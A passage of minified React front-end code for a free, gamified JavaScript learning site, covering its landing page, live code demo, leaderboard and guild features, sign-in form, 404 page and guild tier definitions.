p.jsx(L.div,{ref:s,className:"inline-block "+(t??""),style:{x:o,y:a},onMouseMove:l,onMouseLeave:()=>{r.set(0),i.set(0)},children:e})}const AO=[{icon:"⚡",title:"Learn by running real code",text:"Every lesson ships with a live editor and console. No videos — you write JavaScript from minute one.",gradient:"from-gold-400/20 to-gold-300/5"},{icon:"✓",title:"Exercises that verify themselves",text:"Each lesson checks your output automatically, so you always know whether you actually got it.",gradient:"from-ink-950/10 to-paper-200/50"},{icon:"🧠",title:"Quizzes that lock it in",text:"Short quizzes with explanations at the end of every lesson. Score 100% to mark it complete.",gradient:"from-gold-300/15 to-paper-200/40"},{icon:"∞",title:"100% free, forever",text:"One free account keeps every score, streak, and badge — no paywall, no ads, no catch.",gradient:"from-paper-200/60 to-gold-400/10"}],ig=["console.log","React","async/await","TypeScript","Node.js","Algorithms","Tailwind","REST APIs","Git","Docker","PostgreSQL","Python","GraphQL","CI/CD","Testing","Security","Architecture","DSAs","Serverless","Microservices"],EO=["The","code","teacher","that","runs","your","code"];function RO(){const{user:e}=Li(),t=Za();if(!e)return p.jsx(vt,{className:"mx-auto mt-12 max-w-2xl",children:p.jsx(Ws,{max:4,children:p.jsxs(Re,{to:"/auth?returnTo=%2Flearn",className:"glass glass-edge group flex items-center gap-4 rounded-2xl border border-paper-200/80 p-5 text-left",children:[p.jsx("span",{className:"gradient-text shrink-0 font-mono text-xs font-bold uppercase tracking-[0.2em]",children:"Free account"}),p.jsx("span",{className:"min-w-0 flex-1 font-display text-lg font-medium text-ink-950",children:"Create one to save your progress"}),p.jsx("span",{className:"font-mono text-sm text-gold-600 transition group-hover:translate-x-1",children:"→"})]})})});for(const n of Dt)for(let s=0;s<n.lessons.length;s++){const r=n.lessons[s];if(Ni(t,n.id+"/"+r.id)<1){const i=Bb(Dt[0].id)===n&&s===0;return p.jsx(vt,{className:"mx-auto mt-12 max-w-2xl",children:p.jsx(Ws,{max:4,children:p.jsxs(Re,{to:`/learn/${n.id}/${r.id}`,className:"glass glass-edge group flex items-center gap-4 rounded-2xl border border-paper-200/80 p-5 text-left",children:[p.jsx("span",{className:"gradient-text shrink-0 font-mono text-xs font-bold uppercase tracking-[0.2em]",children:i?"Start here":"Continue"}),p.jsx("span",{className:"min-w-0 flex-1 truncate font-display text-lg font-medium text-ink-950",children:r.title}),p.jsx("span",{className:"font-mono text-sm text-gold-600 transition group-hover:translate-x-1",children:"→"})]})})})}}return p.jsx(vt,{className:"mx-auto mt-12 max-w-2xl",children:p.jsxs("div",{className:"glass glass-edge flex items-center gap-4 rounded-2xl border border-gold-400/40 p-5",children:[p.jsx("span",{className:"gradient-text shrink-0 font-mono text-xs font-bold uppercase tracking-[0.2em]",children:"Complete"}),p.jsx("span",{className:"flex-1 font-display text-lg font-medium text-ink-950",children:"Every lesson finished — congratulations."})]})})}const PO=[{icon:"🏆",title:"Dynamic leaderboards",text:"Weekly, monthly and all-time brackets. A learner who starts today can still take the crown — and your own row glows while you watch the board reorder live."},{icon:"🔥",title:"Quests & streaks",text:"Every module becomes a daily quest. Show up two days running and each day pays a consistency bonus on top of the lesson XP."},{icon:"✨",title:"RPG ascension",text:"Seven ascension tiers unlock gradient avatar frames, animated avatars and rare titles you can equip and show off on the board."},{icon:"⚔",title:"Guilds & social play",text:"Form a guild of up to 25 and pool your XP. Collective rewards unlock as the banner climbs the guild board."}],qO=[{rank:1,name:"Ada N.",xp:4820,level:20,ascension:"mythic",title:"mythic",streak:41},{rank:2,name:"Lin O.",xp:3960,level:17,ascension:"ascendant",title:"architect",streak:22},{rank:3,name:"You",xp:1240,level:6,ascension:"veteran",title:"bugslayer",streak:9,isMe:!0},{rank:4,name:"Sam R.",xp:980,level:5,ascension:"adept",title:"cadet",streak:3}];function OO(){return p.jsxs("section",{className:"relative overflow-hidden border-y border-paper-200 bg-paper-100/50 py-24",children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(It,{className:"left-[5%] top-[15%] bg-gold-400/10",size:200,duration:15}),p.jsx(It,{className:"right-[6%] bottom-[10%] bg-gold-300/15",size:170,duration:12,delay:1})]}),p.jsxs("div",{className:"relative mx-auto max-w-6xl px-4",children:[p.jsxs(vt,{children:[p.jsx("p",{className:"eyebrow text-center",children:"the game layer"}),p.jsx("h2",{className:"mt-4 text-center font-display text-3xl font-semibold tracking-tight text-ink-950 sm:text-4xl",children:"A curriculum that plays like a game"}),p.jsx("p",{className:"mx-auto mt-4 max-w-xl text-center text-ink-600",children:"Same lessons. Same code. But now every completion moves a number you care about, against people who are trying as hard as you are."})]}),p.jsxs("div",{className:"mt-14 grid items-center gap-8 lg:grid-cols-[minmax(0,1fr)_minmax(0,1.05fr)]",children:[p.jsx("div",{className:"space-y-4",children:PO.map((e,t)=>p.jsx(vt,{delay:t*.08,children:p.jsxs("div",{className:"glass glass-edge flex gap-4 rounded-2xl border border-paper-200/60 p-5",children:[p.jsx("span",{className:"text-2xl","aria-hidden":!0,children:e.icon}),p.jsxs("div",{children:[p.jsx("h3",{className:"font-display text-lg font-semibold text-ink-950",children:e.title}),p.jsx("p",{className:"mt-1.5 text-sm leading-relaxed text-ink-600",children:e.text})]})]})},e.title))}),p.jsx(vt,{delay:.15,children:p.jsx(Ws,{max:5,scale:1.01,children:p.jsxs("div",{className:"dark-canvas glass-edge-dark noise-overlay relative overflow-hidden rounded-3xl p-5",children:[p.jsxs("div",{className:"relative flex items-center justify-between",children:[p.jsx("p",{className:"font-mono text-[10px] uppercase tracking-[0.2em] text-gold-400",children:"global · this week"}),p.jsxs(L.span,{className:"flex items-center gap-1.5 font-mono text-[10px] uppercase tracking-widest text-paper-300/70",animate:{opacity:[1,.45,1]},transition:{duration:2,repeat:1/0},children:[p.jsx("span",{className:"h-1.5 w-1.5 rounded-full bg-gold-400"}),"live"]})]}),p.jsx("ul",{className:"relative mt-4 space-y-2",children:qO.map((e,t)=>{const n=Yb(e.ascension,e.level);return p.jsxs(L.li,{initial:{opacity:0,x:24},whileInView:{opacity:1,x:0},viewport:{once:!0},transition:{duration:.5,delay:.2+t*.1,ease:[.22,1,.36,1]},className:"flex items-center gap-3 rounded-xl border px-3 py-2.5 "+(e.isMe?"border-gold-400/70 bg-gold-400/10 shadow-glow":"border-paper-100/10 bg-paper-100/5"),children:[p.jsx(kO,{rank:e.rank}),p.jsx(bO,{name:e.name,level:e.level,ascension:e.ascension,size:"sm"}),p.jsxs("div",{className:"min-w-0 flex-1",children:[p.jsxs("p",{className:"truncate font-display text-sm font-semibold text-paper-50",children:[e.name,e.isMe&&p.jsx("span",{className:"ml-2 rounded-full bg-gold-400 px-1.5 py-0.5 font-mono text-[8px] font-bold uppercase tracking-widest text-ink-950",children:"you"})]}),p.jsxs("div",{className:"mt-1 flex items-center gap-2",children:[p.jsx(SO,{title:e.title,tier:n}),p.jsx("span",{className:"font-mono text-[9px] uppercase tracking-widest text-paper-300/50",children:n.name})]})]}),p.jsx(xO,{days:e.streak}),p.jsxs("span",{className:"font-mono text-sm font-bold text-paper-50",children:[p.jsx("span",{className:"text-gold-400",children:"✦"})," ",e.xp.toLocaleString()]})]},e.name)})}),p.jsxs("div",{className:"relative mt-4 flex items-center justify-between rounded-xl border border-paper-100/10 bg-paper-100/5 px-4 py-3",children:[p.jsxs("div",{children:[p.jsx("p",{className:"font-mono text-[10px] uppercase tracking-widest text-gold-400",children:"daily quests"}),p.jsx("p",{className:"mt-1 font-mono text-[11px] text-paper-300/80",children:"First Blood ✓ · Triple Threat 2/3 · Flawless Run ✓"})]}),p.jsx("span",{className:"font-mono text-xs font-bold text-gold-300",children:"+285 xp"})]})]})})})]}),p.jsx(vt,{delay:.1,children:p.jsxs("div",{className:"mt-10 flex flex-wrap items-center justify-center gap-4",children:[p.jsx(Fu,{children:p.jsx(Re,{to:"/leaderboard",className:"btn-gold text-base",children:"Open the leaderboard →"})}),p.jsx(Re,{to:"/clans",className:"glass rounded-full border border-paper-200/80 px-7 py-3 font-semibold text-ink-800 transition hover:border-gold-400 hover:text-gold-600",children:"Found a guild"})]})})]})]})}function yo({children:e,className:t,depth:n,mx:s,my:r}){const i=Xn(s,a=>a*n),o=Xn(r,a=>a*n);return p.jsx(L.span,{"aria-hidden":!0,className:t,style:{x:i,y:o},animate:{rotate:[0,2,-2,0]},transition:{duration:9,repeat:1/0,ease:"easeInOut"},children:e})}function IO(){const e=Lt(0),t=Lt(0),n=kn(e,{stiffness:50,damping:20}),s=kn(t,{stiffness:50,damping:20}),{scrollY:r}=mb(),i=kn(r,{stiffness:140,damping:30,mass:.35,restDelta:.5}),o=gR(),a=Xn(i,[0,480],[1,0]),l=Xn(i,[0,480],[0,72]),c=Xn(i,[0,700],[0,120]);function u(d){const{innerWidth:h,innerHeight:m}=window;e.set((d.clientX/h-.5)*40),t.set((d.clientY/m-.5)*30)}return p.jsxs("div",{className:"min-h-screen overflow-x-hidden",children:[p.jsx(Di,{}),p.jsxs("section",{className:"relative overflow-hidden mesh-bg noise-overlay",onMouseMove:o?void 0:u,children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(It,{className:"left-[8%] top-[15%] bg-gold-400/10",size:260,duration:16}),p.jsx(It,{className:"right-[10%] top-[25%] bg-gold-300/15",size:200,duration:12,delay:1.5}),p.jsx(It,{className:"bottom-[10%] left-[40%] bg-paper-200/40",size:170,duration:10,delay:.8})]}),p.jsx(L.div,{className:"grid-floor pointer-events-none absolute inset-x-0 bottom-0 h-[45%] opacity-[0.07]",style:{y:c},"aria-hidden":!0}),p.jsxs(L.div,{className:"relative mx-auto max-w-6xl px-4 pb-20 pt-20 text-center sm:pb-24 sm:pt-36",style:o?void 0:{opacity:a,y:l},children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(yo,{className:"absolute left-[5%] top-[12%] hidden rotate-[-6deg] font-mono text-sm text-gold-400/30 sm:block",depth:1.6,mx:n,my:s,children:"const learn = () => {"}),p.jsx(yo,{className:"absolute right-[3%] top-[18%] hidden rotate-[4deg] font-mono text-sm text-ink-600/20 sm:block",depth:-1.2,mx:n,my:s,children:"for (let i = 0; i < infinity; i++)"}),p.jsx(yo,{className:"absolute bottom-[30%] left-[12%] hidden rotate-[-3deg] font-mono text-xs text-gold-500/25 md:block",depth:2.2,mx:n,my:s,children:"</>"}),p.jsx(yo,{className:"absolute bottom-[25%] right-[8%] hidden rotate-[5deg] font-mono text-xs text-ink-700/15 md:block",depth:-1.8,mx:n,my:s,children:"return <Skills />"})]}),p.jsxs("div",{className:"relative z-10",children:[p.jsx(L.p,{className:"eyebrow mb-6 text-sm",initial:{opacity:0,y:12},animate:{opacity:1,y:0},transition:{duration:.5},children:"beta · free forever"}),p.jsx("h1",{className:"mx-auto max-w-4xl font-display text-5xl font-semibold leading-[1.06] tracking-tight text-ink-950 sm:text-7xl lg:text-8xl",style:{perspective:"800px"},"aria-label":"The code teacher that runs your code",children:EO.map((d,h)=>p.jsx(L.span,{className:"mr-[0.24em] inline-block will-change-transform",initial:{opacity:0,y:34,rotateX:-55},animate:{opacity:1,y:0,rotateX:0},transition:{duration:.7,delay:.08+h*.07,ease:[.22,1,.36,1]},children:d==="your"?p.jsx("span",{className:"gradient-text italic",children:d}):d},h))}),p.jsxs(L.p,{className:"mx-auto mt-7 max-w-xl text-lg leading-relaxed text-ink-600",initial:{opacity:0,y:16},animate:{opacity:1,y:0},transition:{duration:.6,delay:.55},children:["Interactive JavaScript lessons with a built-in editor, console, and self-checking exercises. From your first"," ",p.jsx("code",{className:"rounded-md bg-ink-950 px-2 py-0.5 font-mono text-sm text-gold-300",children:"console.log"})," ","to real programs — create a free account and go."]}),p.jsxs(L.div,{className:"mt-11 flex flex-wrap items-center justify-center gap-4",initial:{opacity:0,y:16},animate:{opacity:1,y:0},transition:{duration:.6,delay:.7},children:[p.jsx(Fu,{children:p.jsx(Re,{to:"/auth?returnTo=%2Flearn",className:"btn-gold text-base",children:"Start learning free →"})}),p.jsx(Re,{to:"/auth?returnTo=%2Flearn",className:"glass rounded-full border border-paper-200/80 px-7 py-3 font-semibold text-ink-800 transition hover:border-gold-400 hover:text-gold-600",children:"I already have an account"})]}),p.jsx(L.p,{className:"mt-5 font-mono text-xs text-ink-600",initial:{opacity:0},animate:{opacity:1},transition:{delay:.9},children:"free forever · takes 10 seconds"}),p.jsx(L.div,{className:"mx-auto mt-20 max-w-2xl",initial:{opacity:0,y:60,rotateX:14},animate:{opacity:1,y:0,rotateX:0},transition:{duration:.9,delay:.75,ease:[.22,1,.36,1]},style:{transformPerspective:1e3},children:p.jsx(Ws,{max:7,scale:1.015,children:p.jsxs("div",{className:"code-window text-left shadow-lift",children:[p.jsxs("div",{className:"flex items-center justify-between border-b border-ink-800 px-5 py-3",children:[p.jsxs("div",{className:"flex items-center gap-1.5",children:[p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-ink-700"}),p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-ink-700"}),p.jsx("span",{className:"h-2.5 w-2.5 rounded-full bg-gold-400"})]}),p.jsx("span",{className:"font-mono text-xs text-ink-600",children:"lesson-01.js"})]}),p.jsx("pre",{className:"overflow-x-auto p-6 font-mono text-[13px] leading-relaxed",children:p.jsxs("code",{children:[p.jsx("span",{className:"text-gold-300",children:"const"})," ",p.jsx("span",{className:"text-paper-100",children:"learner"})," ",p.jsx("span",{className:"text-ink-600",children:"="})," ",p.jsx("span",{className:"text-paper-100",children:"{"})," ",p.jsx("span",{className:"text-gold-400",children:"name"}),p.jsx("span",{className:"text-ink-600",children:":"})," ",p.jsx("span",{className:"text-paper-300",children:'"you"'}),p.jsx("span",{className:"text-ink-600",children:","})," ",p.jsx("span",{className:"text-gold-400",children:"excuses"}),p.jsx("span",{className:"text-ink-600",children:":"})," ",p.jsx("span",{className:"text-paper-300",children:'"none"'})," ",p.jsx("span",{className:"text-paper-100",children:"}"}),`
`,p.jsx("span",{className:"text-gold-300",children:"console"}),p.jsx("span",{className:"text-ink-600",children:"."}),p.jsx("span",{className:"text-paper-100",children:"log"}),p.jsx("span",{className:"text-paper-100",children:"("}),p.jsx("span",{className:"text-paper-300",children:'"Hello, free education. 👋"'}),p.jsx("span",{className:"text-paper-100",children:")"}),`

`,p.jsx("span",{className:"text-ink-600",children:"// → Hello, free education. 👋"})]})})]})})}),p.jsx(RO,{})]})]})]}),p.jsx("section",{className:"relative overflow-hidden border-y border-paper-200 bg-ink-950 py-5",children:p.jsx(rg,{speed:45,className:"dark-canvas",children:ig.map((d,h)=>p.jsxs("span",{className:"mx-6 flex shrink-0 items-center gap-3 font-mono text-sm text-paper-100/50",children:[p.jsx("span",{className:"h-1 w-1 rounded-full bg-gold-400/50"}),d]},h))})}),p.jsxs(vt,{className:"mx-auto max-w-6xl px-4 py-20",children:[p.jsx("p",{className:"eyebrow text-center",children:"try it right now"}),p.jsx("h2",{className:"mt-4 text-center font-display text-3xl font-semibold tracking-tight text-ink-950 sm:text-4xl",children:"No signup. Just run code."}),p.jsx("p",{className:"mx-auto mt-4 max-w-md text-center text-ink-600",children:"Edit the code below and press Run. This is exactly what every lesson feels like."}),p.jsx("div",{className:"mx-auto mt-10 max-w-2xl",children:p.jsx(Ws,{max:4,scale:1.008,children:p.jsx(yO,{})})})]}),p.jsxs("section",{className:"mx-auto max-w-6xl px-4 py-24",children:[p.jsxs(vt,{children:[p.jsx("p",{className:"eyebrow text-center",children:"why it works"}),p.jsx("h2",{className:"mt-4 text-center font-display text-3xl font-semibold tracking-tight text-ink-950 sm:text-4xl",children:"Built like a game. Teaches like a mentor."})]}),p.jsx("div",{className:"mt-14 grid gap-5 sm:grid-cols-2 lg:grid-cols-4",style:{perspective:"1200px"},children:AO.map((d,h)=>p.jsx(L.div,{initial:{opacity:0,y:40},whileInView:{opacity:1,y:0},viewport:{once:!0,margin:"-60px"},transition:{duration:.6,delay:h*.1,ease:[.22,1,.36,1]},children:p.jsx(Ws,{max:10,className:"h-full",children:p.jsxs("div",{className:"glass glass-edge group relative h-full overflow-hidden rounded-2xl border border-paper-200/60 p-8 transition-all duration-300",children:[p.jsx("div",{className:`absolute inset-0 bg-gradient-to-br ${d.gradient} opacity-0 transition-opacity duration-300 group-hover:opacity-100`}),p.jsxs("div",{className:"relative z-10",style:{transform:"translateZ(30px)"},children:[p.jsx("span",{className:"text-3xl",children:d.icon}),p.jsx("h3",{className:"mt-5 font-display text-lg font-semibold text-ink-950",children:d.title}),p.jsx("p",{className:"mt-3 text-sm leading-relaxed text-ink-600",children:d.text})]})]})})},d.title))})]}),p.jsx(OO,{}),p.jsxs("section",{className:"mx-auto max-w-6xl px-4 py-20",id:"tracks-section",children:[p.jsx(vt,{children:p.jsxs("div",{id:"tracks",className:"scroll-mt-20",children:[p.jsx("p",{className:"eyebrow text-center",children:"The curriculum"}),p.jsxs("h2",{className:"mt-4 text-center font-display text-4xl font-semibold tracking-tight text-ink-950",children:[Dt.length," tracks · ",Vb," hands-on lessons"]}),p.jsx("p",{className:"mx-auto mt-5 max-w-lg text-center text-ink-600",children:"Start at the top if you're new. Every lesson ends with code you ran yourself and a quiz you passed."})]})}),p.jsx("div",{className:"mt-14 grid gap-6 md:grid-cols-3",style:{perspective:"1200px"},children:Dt.map((d,h)=>p.jsx(L.div,{initial:{opacity:0,y:48,rotateX:8},whileInView:{opacity:1,y:0,rotateX:0},viewport:{once:!0,margin:"-80px"},transition:{duration:.7,delay:h*.1,ease:[.22,1,.36,1]},style:{transformPerspective:1e3},children:p.jsx(aO,{track:d})},d.id))})]}),p.jsx("section",{className:"relative overflow-hidden border-y border-paper-200 bg-paper-100/60 py-5",children:p.jsx(rg,{speed:38,reverse:!0,fadeColor:"rgb(var(--paper-100))",children:ig.slice().reverse().map((d,h)=>p.jsxs("span",{className:"mx-6 flex shrink-0 items-center gap-3 font-mono text-sm text-ink-600/40",children:[p.jsx("span",{className:"h-1 w-1 rounded-full bg-gold-400/40"}),d]},h))})}),p.jsx("section",{className:"mx-auto max-w-6xl px-4 py-20",children:p.jsx(vt,{children:p.jsxs("div",{className:"dark-canvas glass-edge-dark noise-overlay relative overflow-hidden rounded-3xl px-8 py-20 text-center sm:px-14",children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(It,{className:"-right-16 -top-16 bg-gold-400/20",size:320,duration:13}),p.jsx(It,{className:"-bottom-12 -left-12 bg-gold-300/10",size:240,duration:17,delay:2})]}),p.jsxs("div",{className:"relative z-10",children:[p.jsx("p",{className:"font-mono text-xs uppercase tracking-[0.2em] text-gold-400",children:"No excuses left"}),p.jsx("h2",{className:"mx-auto mt-5 max-w-lg font-display text-4xl font-semibold tracking-tight text-paper-50 sm:text-5xl",children:"Ready to write your first line?"}),p.jsx("p",{className:"mx-auto mt-5 max-w-md text-paper-300/80",children:"It takes about five minutes to finish your first lesson. That's it. That's the pitch."}),p.jsxs("div",{className:"mt-10 flex flex-wrap items-center justify-center gap-4",children:[p.jsx(Fu,{children:p.jsx(Re,{to:"/auth?returnTo=%2Flearn",className:"btn-gold text-base",children:"Create your free account →"})}),p.jsx(Re,{to:"/auth?returnTo=%2Flearn",className:"rounded-full border border-paper-100/20 px-7 py-3 font-semibold text-paper-300 transition hover:border-gold-400/60 hover:text-gold-300",children:"Sign in →"})]})]})]})})}),p.jsx("footer",{className:"border-t border-paper-200 py-10 text-center font-mono text-xs text-ink-600",children:"Codexter · a 100% free code teacher · built with ♥ and zero dollars"})]})}const ac="w-full rounded-xl border border-paper-300 bg-paper-50 px-4 py-2.5 text-sm text-ink-950 outline-none transition placeholder:text-ink-400 focus:border-gold-400 focus:ring-2 focus:ring-gold-400/25",NO=[{icon:"☁",title:"Sync across devices",text:"Quiz scores, completed lessons, and badges follow your account — phone, tablet, laptop."},{icon:"🎓",title:"Certificates with your name",text:"Finish a track and your printable certificate is pre-filled with your display name."},{icon:"🔥",title:"Streaks that survive",text:"Your daily streak and XP are safe even if you clear this browser or switch devices."}],jO=["/learn","/playground","/projects","/portfolio","/certificate","/leaderboard","/clans"];function MO(e){return e&&e.startsWith("/")&&!e.startsWith("//")&&jO.some(t=>e===t||e.startsWith(t+"/"))?e:"/learn"}function LO(){const{user:e,authReady:t,signIn:n,signUp:s}=Li(),[r,i]=U1(),o=$a(),a=MO(r.get("returnTo")),[l,c]=w.useState("signin"),[u,d]=w.useState(""),[h,m]=w.useState(""),[f,v]=w.useState(""),[x,y]=w.useState(null),[g,b]=w.useState(!1),k=w.useRef(null);w.useEffect(()=>{t&&e&&(r.has("returnTo")&&i({},{replace:!0}),o(a,{replace:!0}))},[e,t,o,a,r,i]),w.useEffect(()=>{var q;(q=k.current)==null||q.focus()},[l]);function C(q){c(q),y(null)}async function E(q){q.preventDefault(),y(null),b(!0);try{l==="signin"?await n(h.trim(),f):await s(u.trim(),h.trim(),f),o(a,{replace:!0})}catch(R){y(R instanceof Error?R.message:"Something went wrong.")}finally{b(!1)}}const S=l==="signin"?"Welcome back":"Create your account",T=l==="signin"?"Sign in to sync your progress across devices.":"Free forever. Your quiz scores and completed lessons follow you anywhere.";return p.jsxs("div",{className:"min-h-screen",children:[p.jsx(Di,{}),p.jsx("main",{className:"mx-auto max-w-6xl px-4 py-16",children:p.jsxs("div",{className:"grid items-start gap-10 lg:grid-cols-2 lg:gap-16",children:[p.jsxs("section",{className:"order-2 lg:order-1",children:[p.jsxs(L.div,{initial:{opacity:0,y:24},animate:{opacity:1,y:0},transition:{duration:.6,ease:[.22,1,.36,1]},children:[p.jsx("p",{className:"eyebrow",children:"why sign in?"}),p.jsxs("h1",{className:"mt-3 font-display text-4xl font-semibold tracking-tight text-ink-950",children:["Progress worth"," ",p.jsx("span",{className:"gradient-text",children:"keeping"})]}),p.jsx("p",{className:"mt-3 max-w-md leading-relaxed text-ink-600",children:"Create a free account to save every lesson you finish — your work follows you to any device."})]}),p.jsx("ul",{className:"mt-8 space-y-4",children:NO.map((q,R)=>p.jsx(L.li,{initial:{opacity:0,x:-24},animate:{opacity:1,x:0},transition:{duration:.5,delay:.2+R*.12,ease:[.22,1,.36,1]},children:p.jsxs(L.div,{className:"glass glass-edge group flex gap-4 rounded-2xl border border-paper-200/60 p-4",whileHover:{x:6},transition:{type:"spring",stiffness:300,damping:24},children:[p.jsx("span",{className:"flex h-10 w-10 shrink-0 items-center justify-center rounded-full border border-gold-400/50 bg-gold-400/10 text-gold-600 transition group-hover:shadow-glow",children:q.icon}),p.jsxs("div",{children:[p.jsx("p",{className:"font-semibold text-ink-950",children:q.title}),p.jsx("p",{className:"mt-0.5 text-sm leading-relaxed text-ink-600",children:q.text})]})]})},q.title))}),p.jsxs(L.div,{className:"dark-canvas glass-edge-dark relative mt-10 overflow-hidden rounded-2xl p-6",initial:{opacity:0,y:24},animate:{opacity:1,y:0},transition:{duration:.6,delay:.55,ease:[.22,1,.36,1]},children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(It,{className:"-right-8 -top-8 bg-gold-400/15",size:150,duration:11}),p.jsx("div",{className:"dots-bg-dark absolute inset-0 opacity-60"})]}),p.jsxs("div",{className:"relative z-10",children:[p.jsx("p",{className:"font-mono text-[11px] uppercase tracking-[0.2em] text-gold-400",children:"inside every lesson"}),p.jsx("div",{className:"mt-3 flex flex-wrap gap-2",children:["live editor","console","quizzes","badges","certificates"].map((q,R)=>p.jsx(L.span,{className:"rounded-full border border-paper-100/15 px-3 py-1 font-mono text-[11px] text-paper-300/90",initial:{opacity:0,scale:.8},animate:{opacity:1,scale:1},transition:{delay:.7+R*.08,type:"spring",stiffness:300,damping:20},children:q},q))})]})]}),p.jsx("p",{className:"mt-10 font-mono text-xs text-ink-600",children:"no spam · no ads · delete your account data anytime"})]}),p.jsx("section",{className:"order-1 lg:order-2",style:{perspective:"1200px"},children:!t&&!x?p.jsx("div",{className:"card p-10 text-center",children:p.jsx("p",{className:"font-mono text-sm text-ink-600",children:"Checking your session…"})}):p.jsxs(L.div,{className:"glass glass-edge rounded-2xl border border-paper-200/70 p-8 sm:p-10",initial:{opacity:0,y:40,rotateX:8},animate:{opacity:1,y:0,rotateX:0},transition:{duration:.7,ease:[.22,1,.36,1]},children:[p.jsx("p",{className:"eyebrow",children:"Codexter"}),p.jsx("h2",{className:"mt-2 font-display text-3xl font-semibold tracking-tight text-ink-950",children:S}),p.jsx("p",{className:"mt-2 text-sm leading-relaxed text-ink-600",children:T}),p.jsxs("form",{onSubmit:E,className:"mt-6 space-y-3",children:[p.jsx(Pu,{initial:!1,children:l==="signup"&&p.jsx(L.div,{initial:{opacity:0,height:0},animate:{opacity:1,height:"auto"},exit:{opacity:0,height:0},transition:{duration:.25,ease:[.22,1,.36,1]},className:"overflow-hidden",children:p.jsx("input",{ref:k,className:ac,"aria-label":"Your name",placeholder:"Your name",value:u,onChange:q=>d(q.target.value),autoComplete:"name"})},"name-field")}),p.jsx("input",{ref:l==="signin"?k:void 0,className:ac,type:"email",required:!0,"aria-label":"Email address",placeholder:"you@example.com",value:h,onChange:q=>m(q.target.value),autoComplete:"email"}),p.jsx("input",{className:ac,type:"password",required:!0,minLength:8,"aria-label":"Password (at least 8 characters)",placeholder:"Password",value:f,onChange:q=>v(q.target.value),autoComplete:l==="signup"?"new-password":"current-password"}),p.jsx(Pu,{children:x&&p.jsx(L.p,{role:"alert",className:"text-sm text-red-600",initial:{opacity:0,y:-6},animate:{opacity:1,y:0},exit:{opacity:0},children:x})}),p.jsx(L.button,{type:"submit",disabled:g,className:"btn-gold w-full !justify-center disabled:opacity-60",whileHover:g?void 0:{scale:1.02},whileTap:g?void 0:{scale:.97},children:g?"One moment…":l==="signin"?"Sign in":"Create account"})]}),p.jsxs("div",{className:"mt-5 space-y-1.5 text-center text-sm",children:[l!=="signup"&&p.jsxs("p",{className:"text-ink-600",children:["New here?"," ",p.jsx("button",{type:"button",className:"font-semibold text-gold-600 hover:underline",onClick:()=>C("signup"),children:"Create a free account"})]}),l!=="signin"&&p.jsx("p",{className:"text-ink-600",children:p.jsx("button",{type:"button",className:"font-semibold text-gold-600 hover:underline",onClick:()=>C("signin"),children:"← Back to sign in"})})]})]})})]})})]})}function DO(){return p.jsxs("div",{className:"min-h-screen",children:[p.jsx(Di,{}),p.jsxs("main",{className:"relative mx-auto max-w-3xl overflow-hidden px-4 py-28 text-center",children:[p.jsxs("div",{className:"pointer-events-none absolute inset-0","aria-hidden":!0,children:[p.jsx(It,{className:"left-[20%] top-[10%] bg-gold-400/10",size:220,duration:13}),p.jsx(It,{className:"right-[15%] bottom-[5%] bg-paper-200/40",size:160,duration:10,delay:1})]}),p.jsxs("div",{className:"relative z-10",style:{perspective:"900px"},children:[p.jsx(L.p,{className:"gradient-text font-display text-7xl font-semibold",initial:{opacity:0,scale:.7,rotateX:60},animate:{opacity:1,scale:1,rotateX:0},transition:{duration:.7,ease:[.22,1,.36,1]},style:{transformPerspective:900},children:"404"}),p.jsx(L.h1,{className:"mt-6 font-display text-3xl font-semibold text-ink-950",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.55,delay:.15,ease:[.22,1,.36,1]},children:"SyntaxError: page not found"}),p.jsx(L.p,{className:"mx-auto mt-3 max-w-md text-ink-600",initial:{opacity:0,y:16},animate:{opacity:1,y:0},transition:{duration:.55,delay:.28,ease:[.22,1,.36,1]},children:"Unexpected token at line 1, column 1. The page you're looking for doesn't exist."}),p.jsx(L.div,{initial:{opacity:0,y:16},animate:{opacity:1,y:0},transition:{duration:.55,delay:.4,ease:[.22,1,.36,1]},children:p.jsx(Re,{to:"/",className:"btn-primary mt-10",children:"Back to safety"})})]})]})]})}let Ea="none";const Bu=new Set;function _O(e){if(e!==Ea){Ea=e;for(const t of Bu)t(e)}}function qI(){const[e,t]=w.useState(Ea);return w.useEffect(()=>(Bu.add(t),t(Ea),()=>{Bu.delete(t)}),[]),e}function FO(){const e=zr(Rt.profiles.me),t=zr(Rt.clans.mine);return w.useEffect(()=>{e===void 0||t===void 0||_O(t?t.myRole:"none")},[e,t]),null}function BO(){return p.jsx(Oh,{fallback:null,children:p.jsx(FO,{})})}const wo=[{id:"band",name:"Band",minXp:0,perk:"Shared guild banner"},{id:"company",name:"Company",minXp:500,perk:"+1 guild streak shield"},{id:"order",name:"Order",minXp:2e3,perk:"Guild aura on the leaderboard"},{id:"coterie",name:"Coterie",minXp:6e3,perk:"Custom guild reward tag"},{id:"legend",name:"Legend",minXp:15e3,perk:"Gilded guild crest + title"}];function OI(e){let t=wo[0];for(const r of wo)e>=r.minXp&&(t=r);const n=wo.indexOf(t),s=wo[n+1]??null;return{tier:t,next:s,toNext:s?s.minXp-e:0,pct:s?Math.round((e-t.minXp)/(s.minXp-t.minXp)*100):100}}const og=[{id:"war-party",title:"War Party",detail:"The guild clears lessons together — every member's completions count.",metric:"lessons",baseTarget:6,perMember:2,rewardXp:600},{id:"xp-tithe",title:"The Tithe",detail:"Pooled weekly XP. Quest bonuses and consistency XP count too.",metric:"xp",baseTarget:600,perMember:80,rewardXp:800},{id:"perfect-vanguard",title:"Perfect Vanguard",detail:"Flawless 100% quiz runs, pooled across the whole guild.",metric:"flawless",baseTarget:3,perMember:1,rewardXp:900},{id:"night-watch",title:"Night Watch",detail:"A long march: pooled lessons with a stretch goal for big guilds.",metric:"lessons",baseTarget:10,perMember:3,rewardXp:1100}];function VO(e){const t=new Date(e+"T00:00:00Z"),n=(t.getUTCDay()+6)%7,s=new Date(t);s.setUTCDate(t.getUTCDate()-n+3);const r=new 